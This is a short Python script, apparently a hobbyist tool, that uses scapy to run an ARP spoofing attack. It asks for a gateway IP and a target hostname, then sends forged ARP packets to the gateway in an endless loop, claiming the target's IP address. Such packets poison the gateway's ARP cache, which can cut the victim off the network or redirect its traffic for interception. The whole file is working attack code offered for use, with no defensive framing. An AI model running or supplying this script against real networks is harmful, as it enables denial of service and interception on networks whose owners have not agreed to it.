import os
from scapy.all import *

gatewayIP = '192.168.170.254'


def arpattack(gatewayIP, targetIP):
    pkt = ARP(psrc=targetIP, pdst=gatewayIP, op=1)
    srloop(pkt)


def main():
    stat = 1
    while stat != 0:
        gatewayIP = input('Please enter gateway IP: ')
        hostName = input('Please enter hostname: ')
        stat = 0
        if gatewayIP == 'exit' or hostName == 'exit':
            print('[Info] Exit')
            return (2)
    try:
        targetIP = socket.gethostbyname(hostName)
        print('[Info] Target IP: ', targetIP)

    except Exception as e:
        print('[Fatal] {}'.format(e))
        return (1)

    try:
        arpattack(gatewayIP, targetIP)

    except KeyboardInterrupt:
        print('[Info] Break')
        return (1)
    except Exception as f:
        print('[Fatal] {}'.format(f))
        return (1)


if __name__ == '__main__':
    while True:
        if main() == 2:
            print('[Info] Exit')
            break